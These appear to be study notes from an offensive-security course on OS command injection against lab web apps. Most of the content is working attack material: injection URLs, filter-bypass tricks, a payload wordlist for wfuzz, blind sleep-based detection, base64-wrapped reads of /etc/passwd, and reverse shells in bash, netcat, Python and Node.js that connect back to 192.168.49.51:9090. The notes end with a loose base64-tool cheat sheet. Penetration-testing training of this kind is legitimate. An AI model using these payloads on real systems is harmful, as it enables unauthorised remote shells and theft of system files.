## Command Injection

---

### Chaining of Commands & System Calls

```shell
http://target:80/python/index.py?ip=127.0.0.1|id
```

Most operating systems allow users to run multiple commands together on one line. In the case of Linux, we can use the semicolon (;), the logical AND (&&), the logical OR (||), and even a single pipe character (|).

```shell
ls -ls
```

As expected, this lists files and directories. As an example of simple command chaining, we will add a semicolon to the end of the command (marking the end of a command in Linux) and follow it with id. This should execute the command sequentially.

```shell
ls -ls ; id
```

We can also use && to chain commands. In this case the second command will only run if the first exits without error:

```shell
whoami && hostname
```

Next, we use && again and note that if the first command fails, the second one won't run.

```shell
foobar && hostname
```

Alternatively, a logical OR (||) will only run the second command if the first fails.

```shell
whoami || id
```

In addition to the semicolon, which allows us to chain multiple commands together in one statement, another unique separator for Linux is the newline (\n), which exists in every HTTP request. Its hexadecimal value is 0x0A.

Finally, let's discuss some Linux-specific inline execution mechanisms. Considers these examples, which use the backtick (`) character and the $() null statement to "wrap" a command ("cmd").

```shell
`cmd`
```

```shell
$(cmd)
```

```shell
echo "This is an `whoami` echo statement"
```

```shell
echo "This is an $(whoami) echo statement"
```

### Common Protections

We'll listen (bind) to the 0.0.0.0 interface (-l), request verbose output (-v), print numerical IP addresses and ports in all output (-n), and bind to port 9090 (-p 9090). Let's combine these arguments and run our listener.

```shell
nc -nlvp 9090
```

Now that we have our Netcat listener established, let's consider a sample payload.

```shell
http://target:80/nodejs/index.js?ip=127.0.0.1|bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'
```

URL-encoded

```shell
curl "http://target/nodejs/index.js?ip=127.0.0.1|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.51/9090+0>%261'"
```


A Null Statement Injection Bypass can be inserted between any characters of our choosing.

---
    This technique also works for more complex payloads like "nc -nlvp 9090", which becomes: n$()c -n$()lvp 9090
---

```shell
wh$()oami
```

```shell
http://target:80/php/blocklisted.php?ip=127.0.0.1;wh$()oami
```

We'll create the following wordlist as command_injection_custom.txt and place it in our home directory.

```txt
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```

```shell
/usr/share/SecLists/command_injection_custom.txt
```

Our list includes an additional "bogus" string so we can guarantee a failed response length when fuzzing, or at least gain an interesting response, which we could render in our browser.

This is important because having a known response size when fuzzing a target endpoint is exceptionally useful when we're filtering our results for successful attempts (or verbose error messages at the very least).

```shell
wfuzz -c -z file,/usr/share/SecLists/command_injection_custom.txt --hc 404 http://target:80/php/blocklisted.php?ip=127.0.0.1FUZZ
```

We have a lot of failed attempts that give us a response length of 1156 bytes. Let's hide these requests by providing wfuzz with the parameter-value combination of --hh 1156.

```shell
wfuzz -c -z file,/usr/share/SecLists/command_injection_custom.txt --hc 404 --hh 1156 http://target:80/php/blocklisted.php?ip=127.0.0.1FUZZ
```

Let's load the payload of "|i$()d" from our Wfuzz output into our browser and note the response.

```url
http://target/php/blocklisted.php?ip=127.0.0.1|i$()d
```

Before we conclude, let's examine one other possible attack vector to bypass blocklisted strings entirely if a backtick (`) character is permitted. This can be achieved by using base64 encoding.

All we need to do is choose the payload we want, and echo it into the base64 binary on our attacking Kali Linux VM.

```shell
echo "cat /etc/passwd" |base64
```

```shell
echo "Y2F0IC9ldGMvcGFzc3dkCg==" |base64 -d
```

URL-encoded

```shell
echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d
```

```shell
http://target/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`
```

```shell
http://target/php/blocklisted_exercise.php?ip=127.0.0.1/ni$(Y2F0IC9ldGMvcGFzc3dkCg)d
```

### Blind OS Command Injection Bypass

Let's try out a blind command injection vulnerability in our sandbox application by attempting to run the id command.

```shell
http://target:80/php/blind.php?ip=127.0.0.1;id
```

To set a benchmark, we will use time to measure how long our curl request takes against a server we know is down:

```shell
time curl http://ci-sandbox:80/php/blind.php?ip=127.0.0.1
```

According to the output, this took 10.014s. This time may vary between virtual environments.

Next, let's inject a twenty-second sleep command to attempt to pause the request's execution. If the request pauses, we may have a blind injection vector.

```shell
time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"
```

This time, the request took thirty seconds. Clearly, the sleep command ran. Very nice. We've discovered a blind command injection vector!

```shell
curl "http://target:80/flag.txt"
```

### Enumerating Command Injection Capabilities

Let's create a wordlist /home/kali/capability_checks.txt and search for Linux-based utilities with wfuzz.

We'll also add "w00tw00t" as a baseline for a non-existent file.

```txt
w00tw00t
wget
curl
fetch
gcc
cc
nc
socat
ping
netstat  
ss
ifconfig
ip
hostname
php
python
python3
perl
java
```

```shell
wfuzz -c -z file,/home/kali/capability_checks.txt --hc 404 "http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which FUZZ"
```

### Obtaining a Shell - Netcat

#### netcat

```shell
nc -nlvp 9090
```

```shell
http://target:80/nodejs/index.js?ip=127.0.0.1|/bin/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
```

#### Python

```python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.49.51",9090))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);'
```

```shell
nc -nlvp 9090
```

```shell
http://target/php/index.php?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

#### NodeJS


```shell
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
```

```shell
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20192.168.49.51%209090%20-e%20%2Fbin%2Fbash%27)%22%20%3E%20%2Fvar%2Ftmp%2Foffsec.js%20%3B%20node%20%2Fvar%2Ftmp%2Foffsec.js
```

#### PHP


# 🔄 Alternatives to `base64` Binary (Encode/Decode)

# ✅ Python (Preferred if available)
# Encode
python3 -c "import base64; print(base64.b64encode(open('input.txt','rb').read()).decode())"

# Decode
python3 -c "import base64; open('output.txt','wb').write(base64.b64decode(open('input.b64','r').read()))"

# ✅ OpenSSL
# Encode
openssl base64 -in input.txt -out output.b64

# Decode
openssl base64 -d -in output.b64 -out decoded.txt

# ✅ Perl
# Encode
perl -MMIME::Base64 -0777 -ne 'print encode_base64($_)' < input.txt

# Decode
perl -MMIME::Base64 -ne 'print decode_base64($_)' < input.b64

# ✅ BusyBox (if available)
# Encode
busybox base64 input.txt

# Decode
busybox base64 -d input.b64

